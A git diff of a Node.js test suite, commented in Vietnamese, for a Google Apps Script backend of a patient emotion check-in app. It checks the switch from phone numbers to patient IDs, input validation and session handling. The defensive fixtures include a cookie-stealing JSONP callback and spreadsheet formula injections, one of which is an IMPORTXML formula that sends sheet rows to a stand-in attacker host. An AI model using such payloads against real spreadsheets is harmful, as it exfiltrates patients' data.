@@ -3,10 +3,11 @@
    LockService / Utilities rồi gọi doGet / doPost như Apps Script sẽ gọi.
    Không gọi mạng, không đụng Sheet thật. Chạy: node tests/test-gas.js   (FAIL → exit 1)
    Kiểm: doGet không trả dữ liệu, JSONP callback được lọc, doPost whitelist 10 mức / 6 cảm xúc,
-   SĐT Việt Nam, chặn công thức = + - @, giới hạn độ dài, LockService, ghi đúng tab theo tên,
-   giờ: giờ máy chủ − ageMs hợp lệ (0…8 ngày) hoặc giờ máy chủ, cùng Mã phiên + cùng SĐT thì cập nhật và giữ cột A,
-   SĐT app cũ lệch chuẩn mà ≥ 9 chữ số vẫn ghi (chỉ chữ số), app mới giữ chuẩn Việt Nam chặt,
-   khác SĐT thì session_conflict, payload ĐÚNG của app cũ (f76adc9, không Mã phiên) vẫn ghi được.
+   Mã số bệnh nhân (01/11/2026: bỏ khoảng trắng/chấm/gạch, còn 3–20 chữ số, giữ số 0 đầu), chặn công thức
+   = + - @, giới hạn độ dài, LockService, ghi đúng tab theo tên, giờ: giờ máy chủ − ageMs hợp lệ (0…8 ngày)
+   hoặc giờ máy chủ, cùng Mã phiên + cùng mã số thì cập nhật và giữ cột A, khác mã số thì session_conflict,
+   Mã phiên bắt buộc (dự án mới không nhận app cũ), B1 "Số điện thoại" tự đổi thành "Mã số bệnh nhân".
+   Cuối file: kiểm nhanh google_apps_script-du-an-cu.js (bản cho dự án CŨ) vẫn tắt doGet và nhận app cũ.
    ========================================================= */
 'use strict';
 const fs = require('fs');
@@ -15,6 +16,7 @@ const vm = require('vm');
 
 const APP = path.resolve(__dirname, '..');
 const SRC = fs.readFileSync(path.join(APP, 'google_apps_script.js'), 'utf8');
+const SRC_OLD = fs.readFileSync(path.join(APP, 'google_apps_script-du-an-cu.js'), 'utf8');
 let fails = 0;
 let passes = 0;
 const T = (name, ok, detail) => { if (ok) passes++; else fails++; console.log((ok ? 'PASS ' : 'FAIL ') + name + (detail !== undefined ? '  → ' + String(detail).replace(/\s+/g, ' ').slice(0, 240) : '')); };
@@ -40,6 +42,7 @@ function makeSheet(name) {
 
 function load(opts) {
   const o = opts || {};
+  const src = o.src || SRC;
   const sheets = {};
   let active = null;
   const ss = {
@@ -58,7 +61,7 @@ function load(opts) {
     console
   };
   vm.createContext(sandbox);
-  vm.runInContext(SRC, sandbox, { filename: 'google_apps_script.js' });
+  vm.runInContext(src, sandbox, { filename: o.src ? 'google_apps_script-du-an-cu.js' : 'google_apps_script.js' });
   if (o.setup) o.setup(sheets, s => { active = s; });
   const P = body => JSON.parse(sandbox.doPost({ postData: { contents: typeof body === 'string' ? body : JSON.stringify(body) } }).getContent());
   const G = p => sandbox.doGet({ parameter: p || {} });
@@ -68,18 +71,23 @@ function load(opts) {
 const sid = n => 'sess-0000-' + String(n).padStart(4, '0');
 const tsOf = cell => Number((/\|(\d+)\]$/.exec(String(cell)) || [])[1]);
 const TZ_RE = /^TZ\[Asia\/Ho_Chi_Minh\|HH:mm:ss dd\/MM\/yyyy\|\d+\]$/;
-/* Payload ĐÚNG như app cũ đang chạy gửi (ditruyenhungvuong/checkin f76adc9, script.js:325-330) */
+/* Payload ĐÚNG như app cũ (ditruyenhungvuong/checkin f76adc9): dự án mới phải từ chối, bản dự án cũ phải nhận */
 const LEGACY = { created_at: '08:00:00 01/10/2026', phone: '0912345678', part1: '7 - Tốt', part2: 'Vui vẻ' };
-const OK = { sessionId: sid(1), phone: '0912345678', level: 3, part1: '3 - Tồi tệ', part2: 'Lo lắng' };
+/* Payload bản 30/10/2026 (checkin-V2, trường phone, có Mã phiên) */
+const V2 = { sessionId: sid(9), phone: '0912345678', level: 3, part1: '3 - Tồi tệ', part2: 'Lo lắng' };
+const OK = { sessionId: sid(1), patientId: '26012345', level: 3, part1: '3 - Tồi tệ', part2: 'Lo lắng' };
+const OLD_HEADER = ['Thời gian', 'Số điện thoại', 'Phần 1: Mức cảm xúc', 'Phần 2: Cảm xúc Capybara'];
+const NEW_HEADER = 'Thời gian|Mã số bệnh nhân|Phần 1: Mức cảm xúc|Phần 2: Cảm xúc Capybara|Mã phiên';
+const noFormula = sh => sh.rows.every(r => r.every(c => !/^[=+\-@]/.test(String(c))));
 
 /* ===== doGet: không còn đọc dữ liệu ===== */
 {
   const env = load();
   env.sheets.CheckIn = makeSheet('CheckIn');
-  env.sheets.CheckIn.rows.push(['Thời gian', 'Số điện thoại', 'Phần 1: Mức cảm xúc', 'Phần 2: Cảm xúc Capybara'], ['08:00:00 01/10/2026', '0911111111', '2 - Rất tồi tệ', 'Buồn']);
+  env.sheets.CheckIn.rows.push(OLD_HEADER, ['08:00:00 01/10/2026', '0911111111', '2 - Rất tồi tệ', 'Buồn']);
   const out = env.G({});
   T('doGet: trả public_read_disabled, MimeType JSON', out.getContent() === '{"result":"error","error":"public_read_disabled"}' && out.mime === 'json', out.getContent());
-  T('doGet: không lộ SĐT dù Sheet có dữ liệu', !/0911111111|Rất tồi tệ/.test(out.getContent()));
+  T('doGet: không lộ dữ liệu dù Sheet có dữ liệu', !/0911111111|Rất tồi tệ/.test(out.getContent()));
   const jp = env.G({ callback: 'alert(document.cookie)//' });
   T('doGet: bỏ JSONP – có ?callback= vẫn trả JSON thuần, không trả JavaScript', jp.getContent() === '{"result":"error","error":"public_read_disabled"}' && jp.mime === 'json', jp.getContent());
   T('Nguồn: doGet không gọi getRange/getValues (không có đường đọc bảng)', !/function doGet[\s\S]*?\n}/.exec(SRC)[0].match(/getRange|getValues|sheet_\(/));
@@ -92,46 +100,80 @@ const OK = { sessionId: sid(1), phone: '0912345678', level: 3, part1: '3 - Tồi
   const sh = env.sheets.CheckIn;
   T('POST hợp lệ → success inserted, không trả số dòng', JSON.stringify(r) === '{"result":"success","action":"inserted"}', JSON.stringify(r));
   T('Ghi đúng tab tên "CheckIn" (tự tạo), không ghi vào tab đang mở "Khac"', !!sh && env.sheets.Khac.rows.length === 0);
-  T('Tab trống: tạo 5 tiêu đề, đóng băng hàng 1, ẩn cột E', sh.rows[0].join('|') === 'Thời gian|Số điện thoại|Phần 1: Mức cảm xúc|Phần 2: Cảm xúc Capybara|Mã phiên' && sh.frozen === 1 && sh.hidden.includes(5), sh.rows[0].join('|'));
-  T('Dòng ghi: giờ Asia/Ho_Chi_Minh (không ageMs → giờ máy chủ), SĐT, "3 - Tồi tệ", "Lo lắng", Mã phiên', TZ_RE.test(sh.rows[1][0]) && Math.abs(tsOf(sh.rows[1][0]) - Date.now()) < 5000 && JSON.stringify(sh.rows[1].slice(1)) === JSON.stringify(['0912345678', '3 - Tồi tệ', 'Lo lắng', sid(1)]), JSON.stringify(sh.rows[1]));
+  T('Tab trống: 5 tiêu đề (B "Mã số bệnh nhân"), đóng băng hàng 1, ẩn cột E', sh.rows[0].join('|') === NEW_HEADER && sh.frozen === 1 && sh.hidden.includes(5), sh.rows[0].join('|'));
+  T('Dòng ghi: giờ Asia/Ho_Chi_Minh (không ageMs → giờ máy chủ), mã số, "3 - Tồi tệ", "Lo lắng", Mã phiên', TZ_RE.test(sh.rows[1][0]) && Math.abs(tsOf(sh.rows[1][0]) - Date.now()) < 5000 && JSON.stringify(sh.rows[1].slice(1)) === JSON.stringify(['26012345', '3 - Tồi tệ', 'Lo lắng', sid(1)]), JSON.stringify(sh.rows[1]));
   T('Dòng ghi đặt định dạng văn bản @ chỉ cho dòng đó (giữ số 0 đầu)', sh.numFmt.includes('2,1,1x5=@') && sh.numFmt.length === 1, sh.numFmt.join(' '));
   T('LockService: chờ khóa và nhả khóa', env.lock.waits === 1 && env.lock.held === 0);
   const colA = sh.rows[1][0];
-  const r2 = env.P(Object.assign({}, OK, { level: 4, part1: '4 - Kém', ageMs: 3 * 864e5 }));
-  T('Cùng Mã phiên + cùng SĐT → updated, vẫn 1 dòng, cập nhật mức, GIỮ cột A (giờ lần đầu)', r2.action === 'updated' && sh.rows.length === 2 && sh.rows[1][2] === '4 - Kém' && sh.rows[1][0] === colA, JSON.stringify(r2) + ' ' + JSON.stringify(sh.rows[1]));
+  const r2 = env.P(Object.assign({}, OK, { patientId: '260 123 45', level: 4, part1: '4 - Kém', ageMs: 3 * 864e5 }));
+  T('Cùng Mã phiên + cùng mã số ("260 123 45" = 26012345) → updated, vẫn 1 dòng, cập nhật mức, GIỮ cột A', r2.action === 'updated' && sh.rows.length === 2 && sh.rows[1][2] === '4 - Kém' && sh.rows[1][0] === colA, JSON.stringify(r2) + ' ' + JSON.stringify(sh.rows[1]));
   T('Cập nhật: định dạng @ chỉ đặt cho B–E của dòng đó', sh.numFmt[sh.numFmt.length - 1] === '2,2,1x4=@', sh.numFmt.join(' '));
-  const r3 = env.P(Object.assign({}, OK, { phone: '0987654321', level: 10, part2: 'Vui vẻ' }));
-  T('Cùng Mã phiên mà KHÁC SĐT → session_conflict, dòng cũ không đổi', JSON.stringify(r3) === '{"result":"error","error":"session_conflict"}' && sh.rows[1][1] === '0912345678' && sh.rows[1][2] === '4 - Kém' && sh.rows.length === 2, JSON.stringify(r3) + ' ' + JSON.stringify(sh.rows[1]));
-  env.P(Object.assign({}, OK, { sessionId: sid(2), phone: '+84 987 654 321', level: 10, part2: 'Vui vẻ' }));
-  T('Mã phiên khác → thêm dòng; "+84 987 654 321" chuẩn hóa thành 0987654321', sh.rows.length === 3 && sh.rows[2][1] === '0987654321' && sh.rows[2][2] === '10 - Rất tuyệt vời', JSON.stringify(sh.rows[2]));
-  env.P({ sessionId: sid(3), phone: '024 3825 1234', level: 7, part2: 'Khó chịu' });
-  T('SĐT cố định 11 số 02x được nhận', sh.rows[3] && sh.rows[3][1] === '02438251234', JSON.stringify(sh.rows[3]));
-  env.P({ sessionId: sid(5), phone: '0912345678', level: '8', part1: '=HYPERLINK("https://evil";"x")', part2: 'Hoảng hốt', created_at: '=NOW()' });
-  T('part1 client gửi bị bỏ, server ghép lại từ bảng; created_at client bị bỏ', sh.rows[4] && sh.rows[4][2] === '8 - Rất tốt' && TZ_RE.test(sh.rows[4][0]), JSON.stringify(sh.rows[4]));
-  T('Không ô nào trong Sheet bắt đầu bằng = + - @', sh.rows.every(r => r.every(c => !/^[=+\-@]/.test(String(c)))));
+  const r3 = env.P(Object.assign({}, OK, { patientId: '26099999', level: 10, part2: 'Vui vẻ' }));
+  T('Cùng Mã phiên mà KHÁC mã số → session_conflict, dòng cũ không đổi', JSON.stringify(r3) === '{"result":"error","error":"session_conflict"}' && sh.rows[1][1] === '26012345' && sh.rows[1][2] === '4 - Kém' && sh.rows.length === 2, JSON.stringify(r3) + ' ' + JSON.stringify(sh.rows[1]));
+  env.P(Object.assign({}, OK, { sessionId: sid(5), patientId: '26012345', level: '8', part1: '=HYPERLINK("https://evil";"x")', part2: 'Hoảng hốt', created_at: '=NOW()' }));
+  T('part1 client gửi bị bỏ, server ghép lại từ bảng; created_at client bị bỏ', sh.rows[2] && sh.rows[2][2] === '8 - Rất tốt' && TZ_RE.test(sh.rows[2][0]), JSON.stringify(sh.rows[2]));
+  T('Không ô nào trong Sheet bắt đầu bằng = + - @', noFormula(sh));
 }
 
-/* ===== App CŨ đang chạy (payload f76adc9, không Mã phiên) – sau khi cập nhật bản triển khai cũ ===== */
+/* ===== Mã số bệnh nhân: chỉ chữ số, 3–20 số sau khi bỏ khoảng trắng/chấm/gạch ===== */
 {
   const env = load();
-  const before = Date.now();
+  const sh = () => env.sheets.CheckIn;
+  const keep = [
+    ['26012345', '26012345'],
+    ['0012345', '0012345'],
+    ['260 123 45', '26012345'],
+    ['260.123.45', '26012345'],
+    ['260-123-45', '26012345'],
+    ['  26012345  ', '26012345'],
+    ['123', '123'],
+    ['1'.repeat(20), '1'.repeat(20)],
+    ['00 000 000 000 000 000 01', '0000000000000000001'],
+    ['-26012345 (dấu gạch đầu bị bỏ như mọi dấu gạch)', '26012345'],
+    ['0912345678', '0912345678']
+  ];
+  const got = keep.map(([raw, want], i) => {
+    const r = env.P(Object.assign({}, OK, { sessionId: sid(200 + i), patientId: raw.replace(/ \(.*\)$/, '') }));
+    const b = r.result === 'success' ? sh().rows[sh().rows.length - 1][1] : '';
+    return { raw, ok: r.result === 'success' && b === want && typeof b === 'string' && /^\d+$/.test(b), got: JSON.stringify(r) + ' B=' + b };
+  });
+  T('Mã số: ' + keep.length + ' mẫu hợp lệ (26012345, "0012345" giữ số 0, "260 123 45", chấm, gạch, 3 số, 20 số…) ghi đúng, cột B chỉ chữ số', got.every(g => g.ok), got.filter(g => !g.ok).map(g => g.raw + ':' + g.got).join(' | '));
+  T('Mã số "0012345": ô B là CHUỖI "0012345" và dòng đặt định dạng @ (Sheets không cắt số 0)', sh().rows.some(r => r[1] === '0012345') && sh().numFmt.every(f => f.endsWith('=@')));
+  const drop = [
+    ['"12" (2 số)', '12'],
+    ['21 chữ số', '1'.repeat(21)],
+    ['"HV123"', 'HV123'],
+    ['"=1+1"', '=1+1'],
+    ['rỗng', ''],
+    ['chỉ khoảng trắng', '   '],
+    ['"+26012345"', '+26012345'],
+    ['"@26012345"', '@26012345'],
+    ['"26012345abc"', '26012345abc'],
+    ['"(026) 012345" (ngoặc)', '(026) 012345'],
+    ['"260_123"', '260_123'],
+    ['chữ số Ả Rập-Ấn "٢٦٠١٢٣"', '٢٦٠١٢٣'],
+    ['=IMPORTXML(...)', '=IMPORTXML("https://evil.example/?d="&JOIN(";";B2:D500);"//a")'],
+    ['41 ký tự (phần lớn là khoảng trắng)', '123' + ' '.repeat(38)],
+    ['là số 26012345 (không phải chuỗi)', 26012345],
+    ['là mảng', ['26012345']],
+    ['null', null],
+    ['thiếu trường', undefined]
+  ];
+  const dropped = drop.map(([n, raw], i) => { const b = Object.assign({}, OK, { sessionId: sid(250 + i), patientId: raw }); if (raw === undefined) delete b.patientId; const r = env.P(b); return { n, ok: r.error === 'patient_id_invalid' && !r.retry, r }; });
+  T('Mã số: ' + drop.length + ' mẫu sai ("12", 21 chữ số, "HV123", "=1+1", rỗng, + @ đầu, ngoặc, chữ số ngoài ASCII, kiểu số/mảng…) → patient_id_invalid', dropped.every(d => d.ok), dropped.filter(d => !d.ok).map(d => d.n + ':' + JSON.stringify(d.r)).join(' | '));
+  T('Mã số: không ô nào bắt đầu bằng = + - @', noFormula(sh()));
+}
+
+/* ===== Dự án mới KHÔNG nhận lượt thiếu Mã phiên hay trường phone cũ ===== */
+{
+  const env = load();
   const r1 = env.P(LEGACY);
-  const r2 = env.P(LEGACY);
-  const sh = env.sheets.CheckIn;
-  T('App cũ: payload đúng {created_at, phone, part1, part2} → success inserted', JSON.stringify(r1) === '{"result":"success","action":"inserted"}', JSON.stringify(r1));
-  T('App cũ: đọc mức từ part1 "7 - Tốt", cột E (Mã phiên) để trống', sh.rows[1] && sh.rows[1][1] === '0912345678' && sh.rows[1][2] === '7 - Tốt' && sh.rows[1][3] === 'Vui vẻ' && sh.rows[1][4] === '', JSON.stringify(sh.rows[1]));
-  T('App cũ: created_at "08:00:00 01/10/2026" của client bị bỏ, cột A là giờ máy chủ', TZ_RE.test(sh.rows[1][0]) && tsOf(sh.rows[1][0]) >= before, JSON.stringify(sh.rows[1][0]));
-  T('App cũ: gửi 2 lần → 2 dòng (không cập nhật nhầm dòng nào)', JSON.stringify(r2) === '{"result":"success","action":"inserted"}' && sh.rows.length === 3);
-  const bad = [
-    ['created_at là công thức', Object.assign({}, LEGACY, { created_at: '=IMPORTXML("https://evil";"//a")' }), null],
-    ['phone công thức', Object.assign({}, LEGACY, { phone: '=1+1+1+1+1' }), 'phone_invalid'],
-    ['part1 không có số mức', Object.assign({}, LEGACY, { part1: 'Tốt' }), 'level_invalid'],
-    ['part1 "11 - …"', Object.assign({}, LEGACY, { part1: '11 - Rất tuyệt vời' }), 'level_invalid'],
-    ['part1 "=7 - Tốt"', Object.assign({}, LEGACY, { part1: '=7 - Tốt' }), 'level_invalid'],
-    ['part2 ngoài 6 nhãn', Object.assign({}, LEGACY, { part2: '=HYPERLINK("x")' }), 'emotion_invalid']
-  ].map(([n, b, code]) => { const r = env.P(b); return { n, ok: code ? r.error === code : r.result === 'success', r }; });
-  T('App cũ: vẫn qua đủ kiểm tra (created_at công thức bị bỏ; SĐT/mức/cảm xúc sai bị từ chối)', bad.every(x => x.ok), bad.filter(x => !x.ok).map(x => x.n + ':' + JSON.stringify(x.r)).join(' | '));
-  T('App cũ: không ô nào bắt đầu bằng = + - @', sh.rows.every(r => r.every(c => !/^[=+\-@]/.test(String(c)))), JSON.stringify(sh.rows));
+  T('Payload app cũ f76adc9 (không Mã phiên) → session_invalid, không ghi', r1.error === 'session_invalid' && !env.sheets.CheckIn, JSON.stringify(r1));
+  const r2 = env.P(V2);
+  T('Payload bản 30/10 (trường phone, chưa có patientId) → patient_id_invalid, không ghi', r2.error === 'patient_id_invalid' && !env.sheets.CheckIn, JSON.stringify(r2));
+  const r3 = env.P(Object.assign({}, OK, { level: undefined }));
+  T('Thiếu level (không còn đọc số mức từ part1 "3 - Tồi tệ") → level_invalid', r3.error === 'level_invalid', JSON.stringify(r3));
+  T('Nguồn: đã bỏ legacyPhone_, normalizePhone_, nhánh app cũ', !/legacyPhone_|normalizePhone_|LEGACY_PHONE/.test(SRC));
 }
 
 /* ===== ageMs: độ trễ từ lúc bấm tới lúc gửi, giờ = giờ nhận − ageMs (không phụ thuộc đồng hồ điện thoại) ===== */
@@ -163,38 +205,6 @@ const OK = { sessionId: sid(1), phone: '0912345678', level: 3, part1: '3 - Tồi
   T('Nguồn: không còn nhận clientTs (giờ tuyệt đối của điện thoại)', !/clientTs/.test(SRC));
 }
 
-/* ===== SĐT app cũ lệch chuẩn (review lần 3): vẫn ghi, cột B chỉ chữ số; app mới giữ chặt ===== */
-{
-  const env = load();
-  const sh = () => env.sheets.CheckIn;
-  const keep = [
-    ['912345678', '912345678'],
-    ['01234567890', '01234567890'],
-    ['091234567', '091234567'],
-    ['09123456789', '09123456789'],
-    ['0912345678 chi Lan', '0912345678'],
-    ['0084912345678', '0912345678'],
-    ['0912 345 678', '0912345678'],
-    ['+84 912 345 678', '0912345678'],
-    ['(+84)912345678', '0912345678'],
-    ['+1 202 555 0143', '0012025550143'],
-    ['0912345678 0912345678', '09123456780912345678']
-  ];
-  const got = keep.map(([raw, want]) => {
-    const r = env.P(Object.assign({}, LEGACY, { phone: raw }));
-    const b = r.result === 'success' ? sh().rows[sh().rows.length - 1][1] : '';
-    return { raw, ok: r.result === 'success' && b === want && /^\d+$/.test(b), got: JSON.stringify(r) + ' B=' + b };
-  });
-  T('App cũ: ' + keep.length + ' SĐT lệch chuẩn (912345678, 01234567890, 091234567, 09123456789, "0912345678 chi Lan", 0084912345678…) vẫn ghi, cột B chỉ chữ số', got.every(g => g.ok), got.filter(g => !g.ok).map(g => g.raw + ':' + g.got).join(' | '));
-  const drop = ['=1+1+1+1+1', '+1+1+1+1+1', '-1-1-1-1-1', '@SUM(A1:A9)', '09123456', '12345678', 'abcdefghi', '0912 345 6', '1'.repeat(9) + 'x'.repeat(22)];
-  const dropped = drop.map(raw => ({ raw, r: env.P(Object.assign({}, LEGACY, { phone: raw })) }));
-  T('App cũ: công thức, chuỗi < 9 chữ số, chuỗi > 30 ký tự vẫn bị từ chối (phone_invalid)', dropped.every(d => d.r.error === 'phone_invalid'), dropped.filter(d => d.r.error !== 'phone_invalid').map(d => d.raw + ':' + JSON.stringify(d.r)).join(' | '));
-  T('App cũ: không ô nào bắt đầu bằng = + - @', sh().rows.every(r => r.every(c => !/^[=+\-@]/.test(String(c)))));
-  const strict = ['912345678', '01234567890', '091234567', '09123456789', '0912345678 chi Lan', '0084912345678'];
-  const s2 = strict.map((raw, i) => ({ raw, r: env.P(Object.assign({}, OK, { sessionId: sid(300 + i), phone: raw })) }));
-  T('App mới (có Mã phiên): 6 mẫu trên vẫn bị từ chối, giữ chuẩn Việt Nam chặt', s2.every(x => x.r.error === 'phone_invalid'), s2.filter(x => x.r.error !== 'phone_invalid').map(x => x.raw + ':' + JSON.stringify(x.r)).join(' | '));
-}
-
 /* ===== Mức: whitelist chặt kiểu ===== */
 {
   const env = load();
@@ -208,13 +218,9 @@ const OK = { sessionId: sid(1), phone: '0912345678', level: 3, part1: '3 - Tồi
 {
   const env = load();
   const bad = [
-    ['phone "=1+1+1+1+1"', Object.assign({}, OK, { phone: '=1+1+1+1+1' }), 'phone_invalid'],
-    ['phone =IMPORTXML(...)', Object.assign({}, OK, { phone: '=IMPORTXML("https://evil.example/?d="&JOIN(";";B2:D500);"//a")' }), 'phone_invalid'],
-    ['phone "abcdefghi"', Object.assign({}, OK, { phone: 'abcdefghi' }), 'phone_invalid'],
-    ['phone 8 số', Object.assign({}, OK, { phone: '09123456' }), 'phone_invalid'],
-    ['phone đầu 01 (không còn dùng)', Object.assign({}, OK, { phone: '0123456789' }), 'phone_invalid'],
-    ['phone 21 ký tự', Object.assign({}, OK, { phone: '0912345678 0912345678' }), 'phone_invalid'],
-    ['phone thiếu', Object.assign({}, OK, { phone: '' }), 'phone_invalid'],
+    ['patientId "=1+1+1+1+1"', Object.assign({}, OK, { patientId: '=1+1+1+1+1' }), 'patient_id_invalid'],
+    ['patientId "abcdefghi"', Object.assign({}, OK, { patientId: 'abcdefghi' }), 'patient_id_invalid'],
+    ['patientId thiếu', Object.assign({}, OK, { patientId: '' }), 'patient_id_invalid'],
     ['level 0', Object.assign({}, OK, { level: 0 }), 'level_invalid'],
     ['level 11', Object.assign({}, OK, { level: 11 }), 'level_invalid'],
     ['level 2.5', Object.assign({}, OK, { level: 2.5 }), 'level_invalid'],
@@ -227,7 +233,8 @@ const OK = { sessionId: sid(1), phone: '0912345678', level: 3, part1: '3 - Tồi
     ['sessionId 7 ký tự', Object.assign({}, OK, { sessionId: 'abc-def' }), 'session_invalid'],
     ['sessionId là số', Object.assign({}, OK, { sessionId: 12345678 }), 'session_invalid'],
     ['sessionId 41 ký tự', Object.assign({}, OK, { sessionId: 'a'.repeat(41) }), 'session_invalid'],
-    ['phone là mảng', Object.assign({}, OK, { phone: ['0912345678'] }), 'phone_invalid'],
+    ['sessionId thiếu', Object.assign({}, OK, { sessionId: undefined }), 'session_invalid'],
+    ['sessionId rỗng', Object.assign({}, OK, { sessionId: '' }), 'session_invalid'],
     ['cảm xúc là mảng', Object.assign({}, OK, { part2: ['Vui vẻ'] }), 'emotion_invalid']
   ];
   const got = bad.map(([n, body, code]) => { const r = env.P(body); return { n, ok: r.result === 'error' && r.error === code && !r.retry, r }; });
@@ -248,15 +255,25 @@ const OK = { sessionId: sid(1), phone: '0912345678', level: 3, part1: '3 - Tồi
   T('Khóa bận: {result:error, error:server_busy, retry:true}, không kèm thông điệp nội bộ', JSON.stringify(r) === '{"result":"error","error":"server_busy","retry":true}', JSON.stringify(r));
 }
 
-/* ===== Tab cũ 4 cột (dữ liệu từ bản trước) ===== */
+/* ===== Tab đã có tiêu đề cũ "Số điện thoại" (dữ liệu ghi 30–31/10/2026) ===== */
 {
   const env = load();
   env.sheets.CheckIn = makeSheet('CheckIn');
-  env.sheets.CheckIn.rows.push(['Thời gian', 'Số điện thoại', 'Phần 1: Mức cảm xúc', 'Phần 2: Cảm xúc Capybara'], ['08:00:00 01/10/2026', '0911111111', '2 - Rất tồi tệ', 'Buồn']);
+  env.sheets.CheckIn.rows.push(OLD_HEADER.concat(['Mã phiên']), ['08:00:00 31/10/2026', '0911111111', '2 - Rất tồi tệ', 'Buồn', sid(77)]);
   env.P(OK);
   const sh = env.sheets.CheckIn;
-  T('Tab cũ: thêm tiêu đề E "Mã phiên" + ẩn, không đụng A–D và dòng cũ', sh.rows[0][4] === 'Mã phiên' && sh.rows[0][0] === 'Thời gian' && sh.hidden.includes(5) && sh.rows[1][1] === '0911111111' && sh.rows.length === 3, JSON.stringify(sh.rows));
+  T('Tab cũ: B1 "Số điện thoại" đổi thành "Mã số bệnh nhân", không đụng A1, E1 và dòng cũ', sh.rows[0].join('|') === NEW_HEADER && sh.rows[1][1] === '0911111111' && sh.rows.length === 3 && sh.rows[2][1] === '26012345', JSON.stringify(sh.rows));
   T('Tab cũ: định dạng @ chỉ đặt cho dòng mới (dòng 3)', sh.numFmt.join(' ') === '3,1,1x5=@', sh.numFmt.join(' '));
+  const env2 = load();
+  env2.sheets.CheckIn = makeSheet('CheckIn');
+  env2.sheets.CheckIn.rows.push(OLD_HEADER, ['08:00:00 01/10/2026', '0911111111', '2 - Rất tồi tệ', 'Buồn']);
+  env2.P(OK);
+  T('Tab 4 cột: thêm E "Mã phiên" + ẩn, đổi B1, dòng cũ giữ nguyên', env2.sheets.CheckIn.rows[0].join('|') === NEW_HEADER && env2.sheets.CheckIn.hidden.includes(5) && env2.sheets.CheckIn.rows[1][1] === '0911111111', JSON.stringify(env2.sheets.CheckIn.rows[0]));
+  const env3 = load();
+  env3.sheets.CheckIn = makeSheet('CheckIn');
+  env3.sheets.CheckIn.rows.push(['Thời gian', 'Mã BN (anh tự đặt)', 'Phần 1: Mức cảm xúc', 'Phần 2: Cảm xúc Capybara', 'Mã phiên']);
+  env3.P(OK);
+  T('Tab có tiêu đề B1 anh tự đặt (khác "Số điện thoại") → giữ nguyên chữ của anh', env3.sheets.CheckIn.rows[0][1] === 'Mã BN (anh tự đặt)');
 }
 
 /* ===== Nhãn khớp với script.js ===== */
@@ -268,21 +285,33 @@ const OK = { sessionId: sid(1), phone: '0912345678', level: 3, part1: '3 - Tồi
   T('LEVEL_TEXTS trùng emotionLevels trong script.js', JSON.stringify(env.sandbox.LEVEL_TEXTS.slice(1)) === JSON.stringify(levels.slice(1)), JSON.stringify(levels));
   const emo = (js.match(/const EMOTIONS = \[([^\]]*)\]/) || [])[1] || '';
   T('EMOTION_LABELS trùng EMOTIONS trong script.js', JSON.stringify(env.sandbox.EMOTION_LABELS) === JSON.stringify(emo.split(',').map(x => x.trim().replace(/^'|'$/g, ''))), emo);
-  /* normalizePhone hai phía phải cho cùng kết quả */
-  const clientFn = (js.match(/function normalizePhone\(raw\) \{[\s\S]*?\n\}/) || [''])[0];
+  /* normalizePatientId hai phía phải cho cùng kết quả */
+  const clientFn = (js.match(/function normalizePatientId\(raw\) \{[\s\S]*?\n\}/) || [''])[0];
   const ctx = {}; vm.createContext(ctx); vm.runInContext(clientFn, ctx);
-  const samples = ['0912345678', '0912 345 678', '+84912345678', '84912345678', '+84 24 3825 1234', '02438251234', '0123456789', 'abc', '=1+1', '', '091234567', '09123456789', '(091) 234-5678', '0912.345.678'];
-  const diff = samples.filter(s => ctx.normalizePhone(s) !== env.sandbox.normalizePhone_(s));
-  T('normalizePhone (web) và normalizePhone_ (server) giống nhau trên 14 mẫu', clientFn && diff.length === 0, diff.join(', '));
+  const samples = ['26012345', '0012345', '260 123 45', '260.123.45', '260-123-45', ' 26012345 ', '12', '123', '1'.repeat(20), '1'.repeat(21), 'HV123', '=1+1', '', null, '+260', '(26)012345', '٢٦٠', '26\u00a0012', '260\t123'];
+  const diff = samples.filter(s => ctx.normalizePatientId(s) !== env.sandbox.normalizePatientId_(s));
+  T('normalizePatientId (web) và normalizePatientId_ (server) giống nhau trên ' + samples.length + ' mẫu', clientFn && diff.length === 0, diff.join(', '));
+  T('Tên trường gửi lên khớp hai phía: web gửi patientId, server đọc data.patientId', /patientId: payload\.patientId/.test(js) && /data\.patientId/.test(SRC) && !/\bphone:/.test(js));
 }
 
 /* ===== Nguồn: hướng dẫn cài và các chốt ===== */
-T('Nguồn: có hướng dẫn tạo TRIỂN KHAI MỚI (URL cũ đã lộ)', /TẠO BẢN TRIỂN KHAI MỚI/.test(SRC) && /Triển khai mới \(New deployment\)/.test(SRC));
+T('Nguồn: hướng dẫn chỉ đúng dự án mới (Sheet bản an toàn 30-10-2026, URL AKfycbzfN8…), cập nhật Phiên bản mới giữ URL', /bản an toàn 30-10-2026/.test(SRC) && /AKfycbzfN8/.test(SRC) && /Phiên bản mới \(New version\)/.test(SRC) && /GIỮ NGUYÊN URL/.test(SRC));
+T('Nguồn: BƯỚC 2 dùng hàm tạm chayThu (Apps Script giấu hàm tên kết thúc "_"), dặn xóa sau khi chạy', /function chayThu\(\) \{ test_\(\); \}/.test(SRC) && /GIẤU các hàm có tên kết thúc bằng dấu gạch dưới/.test(SRC) && /XÓA dòng  function chayThu/.test(SRC) && !/^function chayThu/m.test(SRC));
+T('Nguồn: hướng dẫn nói rõ đổi phone → patientId, làm bước 3–4 liền nhau', /phone → patientId/.test(SRC) && /bước 3–4 liền nhau/.test(SRC));
+T('Nguồn: test_ dùng mã số có số 0 đầu và kiểm cột B giữ số 0', /patientId: '0012 345'/.test(SRC) && /b === '0012345'/.test(SRC));
 T('Nguồn: không dùng getActiveSheet()', !/getActiveSheet\(/.test(SRC.replace(/\/\*[\s\S]*?\*\/|\/\/.*$/gm, '')));
 T('Nguồn: không còn ALLOW_PUBLIC_READ hay đường đọc toàn bảng', !/ALLOW_PUBLIC_READ|readAll_/.test(SRC));
-T('Nguồn: hướng dẫn có bước CẬP NHẬT bản triển khai CŨ lên phiên bản mới, đứng TRƯỚC bước triển khai mới', /BƯỚC 3 – CẬP NHẬT LUÔN BẢN TRIỂN KHAI CŨ/.test(SRC) && SRC.indexOf('BƯỚC 3 – CẬP NHẬT LUÔN') < SRC.indexOf('BƯỚC 5 – TẠO BẢN TRIỂN KHAI MỚI') && /Phiên bản mới \(New version\)/.test(SRC));
-T('Nguồn: bước kiểm công thức dùng Ctrl+H + "Tìm kiếm trong cả công thức", nhắc cột A', /Ctrl\+H/.test(SRC) && /Tìm kiếm trong cả công thức/.test(SRC) && /cột A, B, C, D/.test(SRC));
 T('Nguồn: không còn trả JavaScript (JSONP)', !/MimeType\.JAVASCRIPT/.test(SRC));
